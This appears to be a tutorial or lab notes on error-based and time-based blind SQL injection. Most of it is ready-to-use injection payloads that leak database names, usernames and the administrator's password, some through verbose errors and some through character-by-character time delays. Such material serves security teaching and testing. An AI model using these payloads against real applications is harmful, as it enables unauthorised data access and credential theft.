# Error-Based SQL injection

Error-Based SQLi is an SQL injection technique that involves intentionally causing an error so that the server displays a message containing sensitive information about the database.



## Objective:

- Obtain info such as: database name, column names, versions, etc.
- Make visible vulnerabilities that were invisible.


## Two types of exploited errors:

**1. Conditional Error (Blind Error-Based)**

**Exploiting blind SQL injection by triggering conditional errors**

We trigger an error only if a condition is true.


```sql
' AND (SELECT CASE WHEN (username='admin') THEN 1/0 ELSE 1 END) -- 
```
- If admin exists → division by zero → error
- Otherwise → no error

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
-- No Error

xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a 
-- Error

'||(SELECT '')||'
'||(SELECT '' FROM dual)||'
-- No Error

'||(SELECT '' FROM not-a-real-table)||'
-- Error
```

If we get an error, this demonstrates that it is possible to trigger an error conditionally based on the truth of a specific condition.

```sql
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
-- verify the existence of the users table. Since this query does not return an error, you can deduce that this table does indeed exist.

'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- verify the existence of the username: administrator. Verify that the condition is true (error is received), confirming that there is a user called administrator.

'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- determine the number of characters in the administrator's password. This condition must be true, confirming that the password has more than one character.

'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- confirm that the first character of the password is a
```


**2. Error containing data (Direct Error)**

**Extracting sensitive data via verbose SQL error messages**

We can induce the application to generate an error message containing certain data returned by the query. 

This transforms a previously blind SQL injection vulnerability into a visible one.

We can use the `CAST()` function which allows converting one data type to another.

```sql
' AND CAST((SELECT 1) AS int)--
-- You now get a different error indicating that an AND condition must be a boolean expression.

' AND 1=CAST((SELECT 1) AS int)--
-- you no longer receive an error

' AND 1=CAST((SELECT username FROM users) AS int)--
-- retrieve usernames from the database

' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-- return only one row

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

-- disclose the password
```


```sql
' AND updatexml(null, concat(0x7e, (SELECT database()), 0x7e), null) -- 
```

- Displays the database name in the error.
- Used to extract data directly via error messages.

**Exploiting blind SQL injection by triggering time delays**

If the application catches database errors when executing the SQL query and handles them correctly, the application's response will not be modified. This means that the previous technique of inducing conditional errors will not work.

In this case, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether the injected condition is true or false.

This allows determining the truth of the injected condition based on the time it takes to receive the HTTP response.

> Time delay triggering techniques are specific to the type of database being used.


```sql
-- on Microsoft SQL Server,
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--

-- on PostgreSQL
';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--

'||pg_sleep(10)--
```

- The first of these inputs does not trigger a delay, because the condition 1=2 is false.
- The second input triggers a 10-second delay, because the condition 1=1 is true.

```sql
';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
-- 10s delay if administrator exists

';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
-- 10s delay, confirming that the password has more than one character.

'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
-- 10s delay, for each valid character to retrieve data by testing one character at a time, this tests the character at each position to determine its value.
```
